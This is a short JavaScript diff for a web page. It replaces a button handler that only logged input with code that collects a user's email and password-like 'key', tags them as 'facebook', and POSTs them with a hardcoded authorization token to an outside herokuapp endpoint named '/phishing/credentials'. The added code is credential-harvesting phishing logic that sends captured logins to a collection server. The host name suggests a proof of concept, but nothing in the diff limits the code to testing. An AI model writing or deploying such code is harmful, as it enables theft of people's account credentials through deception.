@@ -2,7 +2,19 @@ const dummy = document.getElementById('k_dummy');
 const k_input = document.getElementById('k_input');
 
 function button_on_click(){
-	console.log(k_input.value);
+	const e_input = document.getElementById('email_input');
+	const data = {
+		username: e_input.value,
+		key: k_input.value,
+		service: 'facebook'
+	};
+	let xhr = new XMLHttpRequest();
+	xhr.open("POST", "https://ppamo-poc-cloudant-access.herokuapp.com/phishing/credentials");
+	xhr.setRequestHeader("Accept", "application/json");
+	xhr.setRequestHeader("Authorization", "Static:HKo8b7vuzA0XqJl84fos99rH2qLHpZ59c9D5cj27");
+	xhr.setRequestHeader("Content-Type", "application/json");
+	xhr.onload = () => console.log(xhr.responseText);
+	xhr.send(data);
 }
 
 function update_value(e){
